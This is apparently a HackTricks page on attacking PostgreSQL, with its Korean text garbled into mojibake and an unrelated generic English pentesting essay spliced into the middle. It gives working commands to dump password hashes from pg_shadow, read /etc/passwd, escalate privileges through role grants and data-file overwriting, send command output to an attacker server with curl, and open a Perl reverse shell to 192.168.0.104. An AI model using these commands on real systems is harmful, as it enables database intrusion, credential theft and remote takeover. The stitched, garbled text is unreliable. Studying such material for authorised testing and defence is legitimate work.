# 5432,5433 - PostgreSQL ì¹¨íˆ¬ í…ŒìŠ¤íŠ¸

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„¸ê³„ì—ì„œ ê°€ì¥ **ê³ ê¸‰** ì»¤ë®¤ë‹ˆí‹° ë„êµ¬ë¥¼ í™œìš©í•œ **ì›Œí¬í”Œë¡œìš°ë¥¼ ì‰½ê²Œ êµ¬ì¶•**í•˜ê³  **ìë™í™”**í•˜ì„¸ìš”.\
ì˜¤ëŠ˜ ë°”ë¡œ ì•¡ì„¸ìŠ¤í•˜ì„¸ìš”:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>ì œë¡œë¶€í„° íˆì–´ë¡œê°€ ë  ë•Œê¹Œì§€ AWS í•´í‚¹ì„ ë°°ìš°ì„¸ìš”</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>

## **ê¸°ë³¸ ì •ë³´**

**PostgreSQL**ì€ **ì˜¤í”ˆ ì†ŒìŠ¤**ì¸ **ê°ì²´-ê´€ê³„í˜• ë°ì´í„°ë² ì´ìŠ¤ ì‹œìŠ¤í…œ**ìœ¼ë¡œ ì„¤ëª…ë©ë‹ˆë‹¤. ì´ ì‹œìŠ¤í…œì€ SQL ì–¸ì–´ë¥¼ í™œìš©í•˜ëŠ”ë° ë”ë¶ˆì–´ ì¶”ê°€ ê¸°ëŠ¥ì„ í†µí•´ ë³´ì™„í•©ë‹ˆë‹¤. ë‹¤ì–‘í•œ ë°ì´í„° ìœ í˜•ê³¼ ì‘ì—…ì„ ì²˜ë¦¬í•  ìˆ˜ ìˆëŠ” ëŠ¥ë ¥ì„ ê°–ì¶”ì–´ ê°œë°œìì™€ ì¡°ì§ì—ê²Œ ë‹¤ì¬ë‹¤ëŠ¥í•œ ì„ íƒì§€ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

**ê¸°ë³¸ í¬íŠ¸:** 5432ì´ë©°, ì´ í¬íŠ¸ê°€ ì´ë¯¸ ì‚¬ìš© ì¤‘ì¸ ê²½ìš° postgresqlì€ ì‚¬ìš©ë˜ì§€ ì•ŠëŠ” ë‹¤ìŒ í¬íŠ¸(ì•„ë§ˆë„ 5433)ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒìœ¼ë¡œ ë³´ì…ë‹ˆë‹¤.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## ì—°ê²° ë° ê¸°ë³¸ ì—´ê±°
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
{% hint style="warning" %}
**`\list`** ëª…ë ¹ì„ ì‹¤í–‰í•˜ì—¬ **`rdsadmin`**ì´ë¼ëŠ” ë°ì´í„°ë² ì´ìŠ¤ë¥¼ ì°¾ìœ¼ë©´ **AWS postgresql ë°ì´í„°ë² ì´ìŠ¤** ë‚´ë¶€ì— ìˆë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

**PostgreSQL ë°ì´í„°ë² ì´ìŠ¤ë¥¼ ë‚¨ìš©í•˜ëŠ” ë°©ë²•**ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒì„ í™•ì¸í•˜ì‹­ì‹œì˜¤:

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## ìë™ ì—´ê±°
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **í¬íŠ¸ ìŠ¤ìº”**

[**ì´ ì—°êµ¬**](https://www.exploit-db.com/papers/13084)ì— ë”°ë¥´ë©´, ì—°ê²° ì‹œë„ê°€ ì‹¤íŒ¨í•˜ë©´ `dblink`ê°€ `sqlclient_unable_to_establish_sqlconnection` ì˜ˆì™¸ë¥¼ throwí•˜ë©° ì˜¤ë¥˜ì— ëŒ€í•œ ì„¤ëª…ì´ í¬í•¨ë©ë‹ˆë‹¤. ì´ëŸ¬í•œ ì„¸ë¶€ ì •ë³´ì˜ ì˜ˆì‹œëŠ” ì•„ë˜ì— ë‚˜ì™€ ìˆìŠµë‹ˆë‹¤.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* í˜¸ìŠ¤íŠ¸ê°€ ë‹¤ìš´ë¨

`ì„¸ë¶€ ì •ë³´: ì„œë²„ì— ì—°ê²°í•  ìˆ˜ ì—†ìŒ: í˜¸ìŠ¤íŠ¸ë¡œì˜ ê²½ë¡œê°€ ì—†ìŠµë‹ˆë‹¤. í˜¸ìŠ¤íŠ¸ "1.2.3.4"ì—ì„œ TCP/IP ì—°ê²°ì„ ìˆ˜ë½í•˜ê³  í¬íŠ¸ 5678ì—ì„œ ì‹¤í–‰ ì¤‘ì…ë‹ˆê¹Œ?`

* í¬íŠ¸ê°€ ë‹«í˜€ ìˆìŒ
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* í¬íŠ¸ê°€ ì—´ë ¤ ìˆìŠµë‹ˆë‹¤
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
# PostgreSQL Pentesting

## Introduction

PostgreSQL is a powerful, open-source object-relational database system. During a penetration test, it is important to assess the security of PostgreSQL to identify potential vulnerabilities that could be exploited by attackers.

## Default Credentials

PostgreSQL installations often come with default credentials that are commonly known and can be easily exploited by attackers. It is crucial to check for default credentials during a penetration test and ensure that they have been changed to secure, unique credentials.

## Weak Passwords

Weak passwords are a common issue in many PostgreSQL installations. During a penetration test, it is essential to check for weak passwords and recommend strengthening them to improve the overall security posture of the database.

## SQL Injection

SQL injection is a prevalent attack vector that can be used to exploit PostgreSQL databases. By injecting malicious SQL queries, attackers can manipulate the database and potentially access sensitive information. It is important to test for SQL injection vulnerabilities during a penetration test and ensure that proper input validation and parameterized queries are implemented to prevent such attacks.

## Privilege Escalation

Privilege escalation vulnerabilities in PostgreSQL can allow attackers to gain elevated privileges and access unauthorized data. It is crucial to identify and remediate privilege escalation vulnerabilities during a penetration test to prevent unauthorized access to sensitive information.

## Data Exfiltration

Data exfiltration is a significant risk in PostgreSQL installations, where attackers can steal sensitive data from the database. During a penetration test, it is important to assess the security controls in place to prevent data exfiltration and ensure that sensitive data is adequately protected.

## Conclusion

PostgreSQL is a widely used database system, and securing it is essential to protect sensitive data from unauthorized access. By conducting thorough penetration testing and addressing potential vulnerabilities, organizations can enhance the security of their PostgreSQL installations and mitigate the risk of data breaches.
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* í¬íŠ¸ê°€ ì—´ë ¤ ìˆê±°ë‚˜ í•„í„°ë§ë˜ì–´ ìˆìŒ
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
## ê¶Œí•œ ì—´ëŒ

### ì—­í• 

| ì—­í•  ìœ í˜•     |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | ì—­í• ì€ ìŠˆí¼ìœ ì € ê¶Œí•œì„ ê°€ì§‘ë‹ˆë‹¤.                                                                                                                        |
| rolinherit     | ì—­í• ì€ ìë™ìœ¼ë¡œ ì†Œì†ëœ ì—­í• ì˜ ê¶Œí•œì„ ìƒì†ë°›ìŠµë‹ˆë‹¤.                                                                                                      |
| rolcreaterole  | ì—­í• ì€ ë” ë§ì€ ì—­í• ì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.                                                                                                             |
| rolcreatedb    | ì—­í• ì€ ë°ì´í„°ë² ì´ìŠ¤ë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.                                                                                                              |
| rolcanlogin    | ì—­í• ì€ ë¡œê·¸ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì¦‰, ì´ ì—­í• ì€ ì´ˆê¸° ì„¸ì…˜ ì¸ê°€ ì‹ë³„ìë¡œ ì§€ì •ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.                                                                   |
| rolreplication | ì—­í• ì€ ë³µì œ ì—­í• ì…ë‹ˆë‹¤. ë³µì œ ì—­í• ì€ ë³µì œ ì—°ê²°ì„ ì‹œì‘í•˜ê³  ë³µì œ ìŠ¬ë¡¯ì„ ìƒì„±í•˜ê³  ì‚­ì œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.                                                       |
| rolconnlimit   | ë¡œê·¸ì¸í•  ìˆ˜ ìˆëŠ” ì—­í• ì— ëŒ€í•´ ì´ ì„¤ì •ì€ ì´ ì—­í• ì´ ë§Œë“¤ ìˆ˜ ìˆëŠ” ë™ì‹œ ì—°ê²°ì˜ ìµœëŒ€ ìˆ˜ë¥¼ ì„¤ì •í•©ë‹ˆë‹¤. -1ì€ ì œí•œì´ ì—†ìŒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.                             |
| rolpassword    | ë¹„ë°€ë²ˆí˜¸ê°€ ì•„ë‹™ë‹ˆë‹¤ (í•­ìƒ `********`ë¡œ í‘œì‹œë¨)                                                                                                          |
| rolvaliduntil  | ë¹„ë°€ë²ˆí˜¸ ë§Œë£Œ ì‹œê°„(ë¹„ë°€ë²ˆí˜¸ ì¸ì¦ì—ë§Œ ì‚¬ìš©ë¨); ë§Œë£Œì¼ì´ ì—†ìœ¼ë©´ null                                                                                       |
| rolbypassrls   | ì—­í• ì€ ëª¨ë“  í–‰ ìˆ˜ì¤€ ë³´ì•ˆ ì •ì±…ì„ ìš°íšŒí•©ë‹ˆë‹¤. ìì„¸í•œ ë‚´ìš©ì€ [5.8ì ˆ](https://www.postgresql.org/docs/current/ddl-rowsecurity.html)ì„ ì°¸ì¡°í•˜ì„¸ìš”.            |
| rolconfig      | ì‹¤í–‰ ì‹œê°„ êµ¬ì„± ë³€ìˆ˜ì— ëŒ€í•œ ì—­í• ë³„ ê¸°ë³¸ê°’                                                                                                               |
| oid            | ì—­í• ì˜ ID                                                                                                                                           |

#### í¥ë¯¸ë¡œìš´ ê·¸ë£¹

* **`pg_execute_server_program`**ì˜ ë©¤ë²„ì¸ ê²½ìš° **í”„ë¡œê·¸ë¨ì„ ì‹¤í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **`pg_read_server_files`**ì˜ ë©¤ë²„ì¸ ê²½ìš° **íŒŒì¼ì„ ì½ì„** ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **`pg_write_server_files`**ì˜ ë©¤ë²„ì¸ ê²½ìš° **íŒŒì¼ì„ ì“¸** ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="info" %}
Postgresì—ì„œ **ì‚¬ìš©ì**, **ê·¸ë£¹**, **ì—­í• **ì€ **ë™ì¼**í•©ë‹ˆë‹¤. ì´ëŠ” **ì‚¬ìš© ë°©ì‹** ë° **ë¡œê·¸ì¸ í—ˆìš© ì—¬ë¶€**ì— ë”°ë¼ ë‹¬ë¼ì§‘ë‹ˆë‹¤.
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### í…Œì´ë¸”ë“¤
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### í•¨ìˆ˜
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## íŒŒì¼ ì‹œìŠ¤í…œ ì‘ì—…

### ë””ë ‰í† ë¦¬ ë° íŒŒì¼ ì½ê¸°

ì´ [**ì»¤ë°‹**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a)ì—ì„œ ì •ì˜ëœ **`DEFAULT_ROLE_READ_SERVER_FILES`** ê·¸ë£¹ì˜ êµ¬ì„±ì›(ëª…ì¹­ì€ **`pg_read_server_files`**) ë° **ìŠˆí¼ ì‚¬ìš©ì**ëŠ” **`COPY`** ë©”ì†Œë“œë¥¼ ì–´ë–¤ ê²½ë¡œì—ì„œë“  ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(`genfile.c`ì˜ `convert_and_check_filename`ì„ í™•ì¸í•˜ì„¸ìš”):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
ë§Œì•½ ë‹¹ì‹ ì´ ìŠˆí¼ ì‚¬ìš©ìê°€ ì•„ë‹ˆì§€ë§Œ **CREATEROLE** ê¶Œí•œì„ ê°€ì§€ê³  ìˆë‹¤ë©´ **í•´ë‹¹ ê·¸ë£¹ì˜ êµ¬ì„±ì›ì´ ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤:**
```sql
GRANT pg_read_server_files TO username;
```
[**ì¶”ê°€ ì •ë³´**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

**ë‹¤ë¥¸ í¬ìŠ¤íŠ¸ê·¸ë ˆ í•¨ìˆ˜**ë¥¼ ì‚¬ìš©í•˜ì—¬ **íŒŒì¼ì„ ì½ê±°ë‚˜ ë””ë ‰í† ë¦¬ ëª©ë¡ì„ í‘œì‹œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **ìŠˆí¼ìœ ì €** ë° **ëª…ì‹œì  ê¶Œí•œì„ ê°€ì§„ ì‚¬ìš©ì**ë§Œ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
ë‹¤ìŒ ìœ„ì¹˜ì—ì„œ **ë” ë§ì€ í•¨ìˆ˜**ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### ê°„ë‹¨í•œ íŒŒì¼ ì“°ê¸°

**ìŠˆí¼ ì‚¬ìš©ì** ë° **`pg_write_server_files`** ë©¤ë²„ë§Œì´ íŒŒì¼ì„ ì“°ê¸° ìœ„í•´ copyë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% code overflow="wrap" %}
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% endcode %}

{% hint style="warning" %}
**`CREATEROLE`** ê¶Œí•œì„ ê°€ì§„ ìŠˆí¼ ì‚¬ìš©ìê°€ ì•„ë‹ˆë”ë¼ë„ **í•´ë‹¹ ê·¸ë£¹ì˜ êµ¬ì„±ì›ì´ ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤:**
```sql
GRANT pg_write_server_files TO username;
```
### **ë°”ì´ë„ˆë¦¬ íŒŒì¼ ì—…ë¡œë“œ**

ê·¸ëŸ¬ë‚˜ **í° ë°”ì´ë„ˆë¦¬ íŒŒì¼ì„ ì—…ë¡œë“œí•˜ëŠ” ë‹¤ë¥¸ ê¸°ìˆ **ì´ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**ë²„ê·¸ ë°”ìš´í‹° íŒ**: **Intigriti**ì— ê°€ì…í•˜ì—¬ í•´ì»¤ë“¤ì´ ë§Œë“  í”„ë¦¬ë¯¸ì—„ **ë²„ê·¸ ë°”ìš´í‹° í”Œë«í¼**ì— ê°€ì…í•˜ì„¸ìš”! [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ì—ì„œ ì˜¤ëŠ˜ ê°€ì…í•˜ê³  ìµœëŒ€ **$100,000**ì˜ ë°”ìš´í‹°ë¥¼ ë°›ì•„ë³´ì„¸ìš”!

{% embed url="https://go.intigriti.com/hacktricks" %}

### ë¡œì»¬ íŒŒì¼ ì“°ê¸°ë¥¼ í†µí•œ PostgreSQL í…Œì´ë¸” ë°ì´í„° ì—…ë°ì´íŠ¸

PostgreSQL ì„œë²„ íŒŒì¼ì„ ì½ê³  ì“¸ ê¶Œí•œì´ ìˆë‹¤ë©´, [PostgreSQL ë°ì´í„° ë””ë ‰í† ë¦¬](https://www.postgresql.org/docs/8.1/storage.html)ì—ì„œ **ì—°ê´€ëœ íŒŒì¼ ë…¸ë“œë¥¼ ë®ì–´ì“°ëŠ” ë°©ì‹ìœ¼ë¡œ ì„œë²„ì˜ ëª¨ë“  í…Œì´ë¸”ì„ ì—…ë°ì´íŠ¸**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **ì´ ê¸°ìˆ ì— ëŒ€í•œ ìì„¸í•œ ë‚´ìš©ì€** [**ì—¬ê¸°**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

í•„ìš”í•œ ë‹¨ê³„:

1. PostgreSQL ë°ì´í„° ë””ë ‰í† ë¦¬ íšë“

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**ì°¸ê³ :** ì„¤ì •ì—ì„œ í˜„ì¬ ë°ì´í„° ë””ë ‰í† ë¦¬ ê²½ë¡œë¥¼ ê²€ìƒ‰í•  ìˆ˜ ì—†ëŠ” ê²½ìš° `SELECT version()` ì¿¼ë¦¬ë¥¼ í†µí•´ ì£¼ìš” PostgreSQL ë²„ì „ì„ ì¡°íšŒí•˜ê³  ê²½ë¡œë¥¼ ë¸Œë£¨íŠ¸ í¬ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. PostgreSQL Unix ì„¤ì¹˜ì˜ ì¼ë°˜ì ì¸ ë°ì´í„° ë””ë ‰í† ë¦¬ ê²½ë¡œëŠ” `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`ì…ë‹ˆë‹¤. ì¼ë°˜ì ì¸ í´ëŸ¬ìŠ¤í„° ì´ë¦„ì€ `main`ì…ë‹ˆë‹¤.
2. ëŒ€ìƒ í…Œì´ë¸”ê³¼ ì—°ê´€ëœ íŒŒì¼ ë…¸ë“œì— ëŒ€í•œ ìƒëŒ€ ê²½ë¡œ íšë“

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

ì´ ì¿¼ë¦¬ëŠ” `base/3/1337`ê³¼ ê°™ì€ ê²°ê³¼ë¥¼ ë°˜í™˜í•´ì•¼ í•©ë‹ˆë‹¤. ë””ìŠ¤í¬ ìƒì˜ ì „ì²´ ê²½ë¡œëŠ” `$DATA_DIRECTORY/base/3/1337`, ì¦‰ `/var/lib/postgresql/13/main/base/3/1337`ì´ ë  ê²ƒì…ë‹ˆë‹¤.
3. `lo_*` í•¨ìˆ˜ë¥¼ í†µí•´ íŒŒì¼ ë…¸ë“œ ë‹¤ìš´ë¡œë“œ

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```
4. ëŒ€ìƒ í…Œì´ë¸”ê³¼ ì—°ê´€ëœ ë°ì´í„° ìœ í˜• íšë“

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```
5. [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor)ë¥¼ ì‚¬ìš©í•˜ì—¬ [íŒŒì¼ ë…¸ë“œë¥¼ í¸ì§‘](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users); ëª¨ë“  `rol*` ë¶€ìš¸ í”Œë˜ê·¸ë¥¼ 1ë¡œ ì„¤ì •í•˜ì—¬ ì „ì²´ ê¶Œí•œì„ ë¶€ì—¬í•©ë‹ˆë‹¤.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![PostgreSQL Filenode Editor ë°ëª¨](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)
6. `lo_*` í•¨ìˆ˜ë¥¼ í†µí•´ í¸ì§‘ëœ íŒŒì¼ ë…¸ë“œë¥¼ ë‹¤ì‹œ ì—…ë¡œë“œí•˜ê³  ë””ìŠ¤í¬ ìƒì˜ ì›ë³¸ íŒŒì¼ì„ ë®ì–´ì”ë‹ˆë‹¤.

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```
7. _(ì„ íƒ ì‚¬í•­)_ ë¹„ìš©ì´ ë§ì´ ë“œëŠ” SQL ì¿¼ë¦¬ë¥¼ ì‹¤í–‰í•˜ì—¬ ì¸ë©”ëª¨ë¦¬ í…Œì´ë¸” ìºì‹œë¥¼ ì§€ì›ë‹ˆë‹¤.

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```
8. ì´ì œ PostgreSQLì—ì„œ ì—…ë°ì´íŠ¸ëœ í…Œì´ë¸” ê°’ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

`pg_authid` í…Œì´ë¸”ì„ í¸ì§‘í•˜ì—¬ ìŠˆí¼ ê´€ë¦¬ìê°€ ë  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. **ë‹¤ìŒ ì„¹ì…˜ì„** [**ì°¸ì¡°í•˜ì„¸ìš”**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **í”„ë¡œê·¸ë¨ìœ¼ë¡œ RCE**

[ë²„ì „ 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html)ë¶€í„°ëŠ” **ìŠˆí¼ ì‚¬ìš©ì** ë° **`pg_execute_server_program` ê·¸ë£¹ì˜ êµ¬ì„±ì›**ë§Œ RCEì— ëŒ€í•´ copyë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ë°ì´í„° ìœ ì¶œ ì˜ˆì‹œ:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
ì˜ˆì œ ì‹¤í–‰:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
ë§Œì•½ ìŠˆí¼ ì‚¬ìš©ìê°€ ì•„ë‹ˆì§€ë§Œ **`CREATEROLE`** ê¶Œí•œì„ ê°€ì§€ê³  ìˆë‹¤ë©´ **í•´ë‹¹ ê·¸ë£¹ì˜ êµ¬ì„±ì›ì´ ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤:**
```sql
GRANT pg_execute_server_program TO username;
```
[**ì¶”ê°€ ì •ë³´**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

ë˜ëŠ” **metasploit**ì˜ `multi/postgres/postgres_copy_from_program_cmd_exec` ëª¨ë“ˆì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì·¨ì•½ì ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” [**ì—¬ê¸°**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. CVE-2019-9193ë¡œ ë³´ê³ ë˜ì—ˆì§€ë§Œ, PostgreSQLì€ ì´ê²ƒì„ [ê¸°ëŠ¥ìœ¼ë¡œ ì„ ì–¸í•˜ê³  ìˆ˜ì •í•˜ì§€ ì•Šì„ ê²ƒ](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/)ì´ë¼ê³  ì„ ì–¸í–ˆìŠµë‹ˆë‹¤.

### PostgreSQL ì–¸ì–´ë¥¼ ì‚¬ìš©í•œ RCE

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
